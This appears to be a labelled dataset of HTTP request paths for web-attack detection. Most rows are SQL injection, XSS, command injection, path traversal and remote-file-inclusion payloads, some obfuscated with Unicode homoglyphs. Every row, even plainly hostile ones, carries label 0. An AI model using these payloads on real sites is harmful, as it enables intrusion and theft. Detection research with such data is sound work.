sentences 	 labels
/ n𝑒𝗐s . php ? config [ script_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  	 0
/ 𝕤𝓉ring / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/ 𝖘𝕥ring / strings / parameters = < iframe xmlns =  "  #  "  src =  " javascript : alert ( 1 )  "  >  <  / iframe >  	 0
/ 𐑈𝘵ring / strings / parameters = < h1 _-_-_-ng_-_-_click =  "  $ event . view . location . replace (  ' javascript : alert ( 1 )  '  )  "  > xss <  / h1 >  	 0
/ ѕ𝗍ring / modo = registro & login = wei & password = yaguan & nombre = estefan & apellidos = tomasa + camino & email = bovell_haygarth @ nuestrasantacruz . vu & dni = 75996092k & direccion = guadiana + s / n + 2 ? c & ciudad = ossa + de + montiel & cp = 08470 & provinciaa = badajoz & ntc = 4288323841686638 & b1 = registrar  	 0
/ 𝙨𝓽ring / strings / parameters = -4711 %  "  "  )  )  union all select 6737 , 6737 , 6737 , 6737 #  	 0
/ m𝑎ℹn . php ? logout = ver ;  > q21667624 & rem ;  	 0
/ ꜱ𝕥ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo gfpzmf )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 0
/ 𝕤𝕥ring / strings / parameters = echo thcqqn $  (  ( 0 + 88 )  )  $  ( echo thcqqn ) thcqqn \  \  	 0
/ ꬲ𝑥amples / jsp / sessions / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904366 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 0
/ 𑣁𝓉ring / modo = registro & login = janey & password = 3s3 '  + and +  ' 1 '  =  ' 1 & nombre = candela & apellidos = bote + montijo & email = despotovich . thalbach @ easyviaggio . by & dni = 06425800z & direccion = ronda + del + general + mitre + s / n ,  +  & ciudad = porto + do + son & cp = 17143 & provincia = palencia & ntc = 8776652546820108 & b1 = registrar  	 0
/ 𝓼𝙩ring / str =  $  ( echo byujus )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ ℮ⅾzaia0i . php3 ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝖘𝒕ring / strings / parameters = `  "  '  >  < img src = xxx : x onerror \ x0c = javascript : alert ( 1 )  >  	 0
/ ѕ𝘁ring / strings / parameters = having 1 = 1 --  	 0
/ 𝓼𝖙ring / strings / parameters = |   [  2 -ne  $  ( echo mgkxid  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ 𐑈𝔱ring / modo = registro ' injected_param & login = benny & password = 0ren3ga6 & nombre = eudosio & apellidos = miguez + chew & email = doyle-murray @ ajuntamentbarcelona2-0 . hn & dni = 76229865e & direccion = travesia + 1 + de + los + laureles ,  + 144 ,  +  & ciudad = sant + cugat + sesgarrigues & cp = 28300 & provincia = burgos & ntc = 9519490312798235 & b1 = registrar  	 0
/ 𑣁𝒕ring / strings / parameters = 1 '  waitfor delay  ' 0 : 0 : 5 '  and  ' jree '  =  ' jree  	 0
/ 𝖘𝖙ring / strings / parameters = & lt ; a href =  \  "  /  / www &  # 46 ; google &  # 46 ; com /  \  "  & gt ; xss & lt ;  / a & gt ;  	 0
/ 𑣁𝒕ring / strings / parameters = 1 )  )  and pg_sleep ( 50 )  --  	 0
/ 𝐬𝓉ring / strings / parameters = 1 '  )  as wtfo where 5666 = 5666 union all select null , null , null , null --  	 0
/ 𝐬𝓉ring / strings / parameters = 1 "  "  union all select null , null , null , null #  	 0
/ ѕ𝘵ring / strings / parameters = 1 '  )  )  ; select  ( case when  ( 3365 = 6236 )  then 3365 else 1 /  ( select 0 )  end )  --  	 0
/ 𝖻m𝗲un223 . php3 ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  / script >  	 0
/ 𝔰𝑡ring / strings / parameters = 1 "  "  where 4345 = 4345 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  --  	 0
/  .  /  .  .  /  .  /  .  .  /  .  /  .  .  /  .  /  .  .  /  .  /  .  .  /  .  /  .  .  /  { file }  	 0
/ 𝘩𝕖lp . php ? q =  ' rm q23433168  #  	 0
/ 𝐬𝘵ring / strings / parameters = 1 ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3  	 0
/ 𝖘𝑡ring / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 83 & b1 =  <  !  --  # exec + cmd =  " rm + -rf +  /  ; cat +  / etc / passwd "  +  --  >  	 0
/ z𝓊ɩhld5m . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ꜱ𝓽ring / strings / parameters = 1 )  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  	 0
/ l𝚛8cfrlf . htm ?  < script > document . cookie =  " testydan = 5106 ;  "  <  / script >  	 0
/ 𝙨𝙩ring / id = 3 & nombre = queso + manchego & precio = 39 /  & cantidad = 28 & b1 = aadir + al + carrito  	 0
/ 𝚜𝕔ripts / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 0
/ ꜱ𝘵ring / strings / parameters = 1 where 3175 = 3175 or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 0
/  / q99252119 &  # 38 ; q8892 &  # 34 ; q8892 &  # 60 ; q8892 &  # 62 ; q99252119  	 0
/ ꬲ𝗑amples / jsp / sessions / rss . php ? blogid = 1 & profile =  .  .  /  .  .  / config / config . properties . php \ x00  	 0
/ 𝖘𝘵ring / strings / parameters = 1 %  '  )  )  and 3580 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  	 0
/ 𝖙o𝖕 . php ? stuff =  '  \ x0duname  > q83658658  #  	 0
/ 𝗌𝓉ring / strings / parameters = '  ; echo qqxbdz $  (  ( 99 + 24 )  )  $  ( echo qqxbdz ) qqxbdz "  	 0
/ 𝕤𝗍ring / strings / parameters = -9725 )  where 9068 = 9068 or elt ( 4723 = 1426 , 1426 )  --  	 0
/ ƽ𝚝ring / strings / parameters = "  ;  str =  $  ( echo iobnnp )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 0
/ 𝚎𝑥amples / jsp / sessions / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00  	 0
/ 𝗌𝘁ring / strings / parameters = 1 union all select null , null #  	 0
/ ℮⤬amples / jsp / colors / index . php ? user_langue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝓼𝕥ring / modo = registro & login = tawauna45 & password = dinosaurio & nombre = delfo & apellidos = modino + esteban & email = ohalloran @ buscadordevideos . bw & dni = 72732622k & direccion = martin + de + bocanogra + 59 ,  + 3f & ciudad = torell & cp = 13108 & provincia = segovia & ntc = 9797216648384975 & b1a = registrar  	 0
/ 𝚜𝒕ring / strings / parameters = < svg >  < script > prompt &  # 40 1 &  # 41 < i >  	 0
/  < script > document . cookie =  " testgfjr = 1286 ;  "  <  / script >  	 0
/ 𝙨𝓽ring / strings / parameters = 1 %  "  "  ; select  ( case when  ( 4666 = 4666 )  then 1 else 4666 *  ( select 4666 from master .  . sysdatabases )  end )  --  	 0
/ 𝕒j𝟹pf49c . exe ?  < meta http-equiv = set-cookie content =  " testnofv = 4170 "  >  	 0
/ 𝓼𝓽ring / strings / parameters = select current server from sysibm . sysdummy1 ;  	 0
/ 𝑎jЗpf49c . fts ?  < script > document . cookie =  " testnofv = 4170 ;  "  <  / script >  	 0
/ ѕ𝖙ring / strings / parameters = < meta http-equiv = set-cookie content =  " testnofv = 4170 "  >  	 0
/ 𝘀𝙩ring / strings / parameters = 1 )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  ( 3626 = 3626  	 0
/ 𝓈𝒕ring / strings / parameters = '   str =  $  ( echo bnzvgd )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𝕤𝓽ring / strings / parameters = .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ windows \  \ win . ini  	 0
/ 𝓼𝕥ring / strings / parameters = "  echo ktlvza $  (  ( 31 + 12 )  )  $  ( echo ktlvza ) ktlvza \  \  	 0
/ ꬲn-ʋs / account / login . php ? user =  "  >  < script > alert (  ' pubcookie_xss . nasl '  )  ;  <  / script >  	 0
/ 𝕤𐐽ript_path / config . inc . php ? _path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  	 0
/ 𝖘𝑐ripts / data / usr  	 0
/ 𐑈𝔱ring / strings / parameters = 1 '  )  as xwlf where 9424 = 9424 ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  #  	 0
/ 𝙨𝐭ring / id = 3 & nombre = vino + rioja & precio = 85paros "  + style =  " background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & cantidad = 71 & b1 = aadir + al + carrito  	 0
/ 𝓼𝔱ring / modo = insertar & precio = 4221 & b1 = confirmarand + 1 = 1  	 0
/ 𝓼𝘁ring / id = 1 & nombre = jamn '  + ibric- ' o & precio = 85 & cantidad = 9 & b1 = aadir + al + carrito  	 0
/ 𑣁𝗍ring / errormsg =  <  !  --  # exec + cmd =  " rm + -rf +  /  ; cat +  / etc / passwd "  +  --  >  	 0
/ 𝓭𝓼lpwt15 . pl ?  < script > document . cookie =  " testtkio = 5454 ;  "  <  / script >  	 0
/ 𐑈𝚝ring / modo = entrar & login = ohma +  + ru & pwd = m893e787 & remember = on & b1 = entrar  	 0
/ 𝑠𝘵ring / strings / parameters = 1 '  )  as ohnu where 4097 = 4097 union all select null , null , null , null , null , null , null , null , null --  	 0
/ 𝗋𝒶anw4ia . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔢n-𝓊s / dda2qr7j . jspa ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ѕ𝘵ring / strings / parameters = -4286 %  "  "  )  )  )  union all select 2229 , 2229 , 2229 , 2229 , 2229 , 2229 #  	 0
/ 𝗰𝕘i-bin / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331919216 , 1114321675  --  	 0
/ 𝙨𝙩ring / strings / parameters = 1 "  "  where 8387 = 8387 ; select  ( case when  ( 2751 = 8206 )  then 2751 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual --  	 0
/ αoᒿ2ww7y . mscgi ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 0
/ 𝙨𝓉ring / strings / parameters = 1 '  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  ' fdgq '  =  ' fdgq  	 0
/ 𝗌𝓽ring / strings / parameters = < script > x =  "  "  < prompt ( 9 )  <  "  "  ; y = 42 ;  <  / script >  	 0
/ ⅇ𝘅amples / jsp / colors / nph-mr . cgi ? do = loginhelp & configlanguage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝙨𝚝ring / str =  $  ( echo ktbjhd )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝘩𝐞lp . php ? q =  ' del \ x09q97628579 \ x09 #  	 0
/ 𝘴𝖙ring / strings / parameters = |   [  4 -ne  $  ( echo awkjgv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  	 0
/ ƽ𝘵ring / strings / parameters = -7676 "  "  )  )  as flov where 7967 = 7967 union all select 7967 --  	 0
/ 𝔰𝕥ring / strings / parameters = < script src = http :  /  / xss . rocks / xss . js ?  < b >  	 0
/ 𝔥𝑒lp . php ? q =  '  & rm q95359585  #  	 0
/ 𝑝𝘩pmyadmin / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝕤𝖙ring / strings / parameters = < object type =  " text / x-scriptlet "  data =  " http :  /  / ha . ckers . org / scriptlet . html "  >  <  / object >  	 0
/ 𝖙ꭒkodz3j . aspx ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝗌𝕥ring / strings / parameters = echo $ ifsubgqbr $  (  ( 73 + 83 )  )  $  ( echo $ ifsubgqbr ) ubgqbr /  /  	 0
/ 𑣁𝓽ring / strings / parameters = http :  /  / raw . githubusercontent . com / fuzzdb-project / fuzzdb / master / attack / xss / test . xxe  	 0
/  /  /  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  { file }  	 0
/ 𝚜𝘵ring / strings / parameters = order by 2 #  	 0
/ 𝘀𝘁ring / strings / parameters = 1 %  "  "  )  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  (  (  "  "  %  "  "  =  "  "  	 0
/ 𝕤𝐭ring / strings / parameters = "  |  | echo $ ifstgmygu $  (  ( 64 + 59 )  )  $  ( echo $ ifstgmygu ) tgmygu |  	 0
/ 𝗌𝓉ring / modo = registro & login = pubs & password =  +  & nombre = juana + del + pilar & apellidos = arias + salavedra & email = keefer-claudio @ hipermadrid . kr & dni = 24987514s & direccion = nucleo + residencial + san + carlos ,  + 5 ,  + 3 ? h & ciudad = alba + de + tormes & cp = 22896 & provincia = castelln & ntc = 2643686847847582 & b1 = registrar  	 0
/ ꜱ𝕥ring / strings / parameters = '   str =  $  ( echo jqnexe )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𝘁o𝗽 . php ? stuff =  "  & ping \ xa0-w \ xa011000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  	 0
/ Ꮒ𝒆lp . php ? q =  "  & del \ x09q66498964 & rem \ x09  	 0
/ 𝘴𝘁ring / strings / parameters = "  |   [  4 -ne  $  ( echo zddhyl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  #  	 0
/ 𝓼𝑡ring / strings / parameters = |   [  3 -ne  $  ( echo gslybh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ 𝒔𝓽ring / strings / parameters = |  | echo wbgpiv $  (  ( 75 + 82 )  )  $  ( echo wbgpiv ) wbgpiv &  	 0
/ 𝕤ᴄript / menu / menuprincipal . php ? path_inc = xxpathxx  	 0
/ 𝔥𝓮lp . php ? q =  "  ; rm \ x09q77596328 \ x09 #  	 0
/ 𝗌𝐭ring / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 25 & b1 = aadir + al + carrito @ 40  	 0
/ j𝒶𝐯ascript /  . passwd . cpp  	 0
/ 𝔠𝔞cti / wiki . php /  < script > foo <  / script >  	 0
/ 𝓈ϲripts / main . php  	 0
/ j𝙖𑣀ascript / purchasing . exe  	 0
/ 𝙨𝗍ring / str =  $  ( echo wbnibq )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 0
/ 𝖍𝚎lp . php ? q =  & del ; q75765892 & rem ;  	 0
/ ƽlo𝓰in_lib . inc . php ? slogin_path = xxpathxx ?  	 0
/ 𝙝𝑒lp . php ? q =  " uname \ x09 > q18952146 \ x09 #  	 0
/ 𝑠𝘵ring / modo = registro & login = kelessog & password = 131o1ho & nombre = servio & apellidos = isoba & email = delubac @ onoratoinformatica . ax & dni = 59608339k & direccion = calle + finlandia ,  + s / n +  & ciudad = mengabril & cp = 1662a & provincia = granada & ntc = 0133515893356936 & b1 = registrar  	 0
/ 𑣁𝗍ring / modo = registro & login = schafer & password = 7li7e37r06 & nombre = santos & apellidos = ricciardiello + ameller & email = kelz @ animationproject . be & dni = 08841812z & direccion = passeig + oreneta + 23 + 8 ? gbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & ciudad = huarte / uharte & cp = 37488 & provincia = cceres & ntc = 7240523818698482 & b1 = registrar  	 0
/ 𝑑𝐞mo / ms-pe02 / catalog . php ? cid = 0 & sid =  '  "  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  &  	 0
/ 𝙝𝑒lp . php ? q =  "  & ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c  	 0
/ j𝖆𝓿ascript / crontab . exe  	 0
/ 𝒔𝔱ring / strings / parameters = < x xmlns : xlink =  " http :  /  / www . w3 . org / 1999 / xlink "  xlink : actuate =  " onload "  xlink : href =  " javascript : alert ( 1 )  "  xlink : type =  " simple "  /  >  	 0
/ 𝓼𝔱ring / strings / parameters = & lt ; script & gt ; alert (  ' xss '  )  ;  & lt ;  / script & gt ;  	 0
/ ꜱ𝚝ring / strings / parameters = 1 %  '  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  and  '  %  '  =  '  	 0
/ 𑣁𝘵ring / modo = registro & login = dajerlin & password = 3o172a1i0m6n19 & nombre = vi , ta & apellidos = bordas + rubies & email = carves @ travelzone . hn & dni = 59561138q & direccion = calle + morera ,  + 139 ,  + 8g & ciudad = funes & cp = 17143 & provincia = toledo & ntc = 9899066630450137 & b1 = registrar  	 0
/ 𝙨𝖙ring / strings / parameters = 1 )  )  )  union all select null , null , null #  	 0
/ 𝚜𝗍ring / strings / parameters = < button autofocus onfocus = confirm ( 2 )  >  	 0
/ jn𝘷𝟴90lt . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝙨𝐭ring / strings / parameters = `  "  '  >  < img src = xxx : x  \ x0donerror = javascript : alert ( 1 )  >  	 0
/ 𝖈ℊis / query ? mss =  .  .  / config  	 0
/ 𝚏𝙘gi-bin / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  '  	 0
/ ѕ𝑡ring / str =  $  ( echo ihgkbj )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ m𝒶ꭵn . php ? stuff =  "  & sleep 10  #  	 0
/ 𝔰𝘵ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo xdaibc )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 0
/ mɑⅈn . php ? stuff =  "  | ping \ x0c-w \ x0c7000 \ x0c-n \ x0c1 \ x0c4 . 3 . 2 . 1 | rem \ x0c  	 0
/ 𝚎𝔵amples / jsp / error / tinybrowser / upload . php ? badfiles = 1 >  < script > alert (  ' tinybrowser_multiple_xss . nasl '  )  <  / script >  	 0
/  < script > document . cookie =  " testnago = 4518 ;  "  <  / script >  	 0
/ ƽ𝐭ring / strings / parameters = -2111 '  union all select 1061 , 1061 , 1061 --  	 0
/ 𝒄𝐠i-bin / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login  	 0
/ j𝒂𝐯ascript / dev . exe  	 0
/ 𝑠𝓽ring / modo = registro & login = lachance & password = su5a & nombre = rogato & apellidos = cucarell + caridad & email = zmed @ tabernarinconete . uk & dni = 19477061v '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & direccion = manuel + paez + xaramillo + 33 ,  + 6b & ciudad = estella / lizarra & cp = 26321 & provincia = tarragona & ntc = 9995470732934706 & b1 = registrar  	 0
/ 𝘀𝙩ring / modo = insertar & precio = 2876 & b1 = confirmar /  	 0
/ 𞣋𝚝9v8k7x . aspx ?  < meta http-equiv = set-cookie content =  " testhvje = 9403 "  >  	 0
/ m𝖺ⅰl . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331905235 , 4 --  & blog = 1  	 0
/ 𝘢oƧ2ww7y . php ?  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 0
/ 𑣁𝙩ring / strings / parameters = 1 '  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  	 0
/ 𐑈𝓽ring / strings / parameters = '  ;  str =  $  ( echo ervjhe )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ 𝘴𝘁ring / strings / parameters = -3347 %  "  "  or 9323 = 9323 #  	 0
/ 𝙨𝗍ring / strings / parameters = 1 '  where 3425 = 3425 and elt ( 4249 = 4249 , 7259 )  --  	 0
/ mα𝗶l_this_entry / mail_autocheck . php ? pm_path = xxpathxx ?  & cmd = ls  	 0
/ ꞟ৪yiqilu . html ?  < meta http-equiv = set-cookie content =  " testswjp = 6010 "  >  	 0
/ 𝖕ℎpmyadmin / data / fetch . php ? page =  '  	 0
/ 𐑈𝔱ring / strings / parameters = < a href =  " javascript \ x09 : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  / a >  	 0
/ 𝓈𝚝ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo usnhdt )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 0
/ 𝐡j𝖉zm96v . php3 ?  < meta http-equiv = set-cookie content =  " testbyqe = 7474 "  >  	 0
/ m𝙞z𝟦r5hz . dll ?  < meta http-equiv = set-cookie content =  " testviqu = 1270 "  >  	 0
/ m𝗮Ꭵn . php ? stuff =  "  \ x0arm q45664393  #  	 0
/ m𝒂n𝔞ger / cart32 . exe  	 0
/ 𝒉еlp . php ? q =  " rm \ x09q57557316 & rem \ x09  	 0
/ jɑѵascript / controller . exe  	 0
/ ҽn-ꭒs / 33y9gcqq . php3 ?  < script > document . cookie =  " testnvxc = 4301 ;  "  <  / script >  	 0
/ 𝗌𝖙ring / strings / parameters = "  |   [  4 -ne  $  ( echo crooyg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 0
/ ѕ𝑡ring / strings / parameters = -4952 '  )  )  )  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  (  ' abso '  =  ' abso  	 0
/ ѕ𝐭ring / strings / parameters = )  , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   --  	 0
/ 𝓮n-𝑢s / 9kr0ih0v . nsf ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  	 0
/ 𝑠𝙩ring / strings / parameters = -7209 '  )  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  (  ' stqx '  =  ' stqx  	 0
/ 𝒔𝓉ring / modo = registro & login = carli8 & password = 5im2n507 & nombre = jos + mara & apellidos = boliart + llo / part & email = baylor @ magichobby . sy & dni = 80135662m & direccion = calle + estrella + orion + 190 +  & ciudad = encinillas & cp = 09681 & provincia = zaragoza & ntc = 2558545383527310 & b1 = registrar  	 0
/ 𝚜𝓽ring / strings / parameters = < meta http-equiv = set-cookie content =  " testnago = 4518 "  >  	 0
/ 𝙨𝚝ring / modo = registro & login = cathleen & password = 5sc0za & nombre = edilma & apellidos = malaver + vaz & email = tillman . clarke-smith7 @ 7horas . cl & dni = b71b937835e & direccion = plza .  + alvaro + de + bazan ,  + 49 + 1g & ciudad = villaescusa + de + roa & cp = 09274 & provincia = vila & ntc = 3695729312300949 & b1 = registrar  	 0
/ 𝕖𝓍amples / servlets / servlet / minis . php ? month =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝕤𝔱ring / strings / parameters = 1 )  )  as smtf where 5829 = 5829 ; select  ( case when  ( 2350 = 8682 )  then 2350 else 1 /  ( select 0 )  end )  --  	 0
/ 𝑠𝑡ring / strings / parameters = | echo $ ifsilkqly $  (  ( 38 + 92 )  )  $  ( echo $ ifsilkqly ) ilkqly &  	 0
/ ꜱ𝐜ripts /  .  .  \ xc1 % pc .  .  \ xc1 % pc .  .  \ xc1 % pc .  .  \ xc1 % pc .  .  \ xc1 % pc .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ z𝒶𝚋bix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  '  /  .  / tmp / rrqfvzowbk0 +  >  +  / dev / null +  &  '  )  .  "  ]  = 1  	 0
/ z𝐚𝖻bix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  ' chmod + 777 +  / tmp / corqrbaqpr . sh '  )  .  "  ]  = 1  	 0
/  < script > document . cookie =  " testggad = 2000 ;  "  <  / script >  	 0
/ 𝓉oρ . php ? stuff =  " ping -w 9000 -n 1 4 . 3 . 2 . 1 | rem  	 0
/ 𝗌𝘁ring / strings / parameters = -9008 '  )  union all select 4976 , 4976 , 4976 , 4976 #  	 0
/ j𝖺𝒗ascript / redirect . exe  	 0
/ 𝘀𝓽ring / strings / parameters = < body / onload =  & lt ;  !  --  & gt ;  &  # 10confirm ( 1 )  ; prompt (  / xss /  . source )  >  	 0
/ 𝕙𝘦lp . php ? q =  \ x0duname  > q66931265  #  	 0
/ 𝙨𝓽ring / strings / parameters = 1 '  where 3612 = 3612 and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  --  	 0
/ j𝖺𝔳ascript / oracle . xml . xsql . xsqlservlet . exe  	 0
/ ꜱ𝚝ring / strings / parameters = ; echo $ ifsxkgkwo $  (  ( 82 + 28 )  )  $  ( echo $ ifsxkgkwo ) xkgkwo '  	 0
/ oρ𝔢nsiteadmin / scripts / classes / form . php ? path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  \ x00  	 0
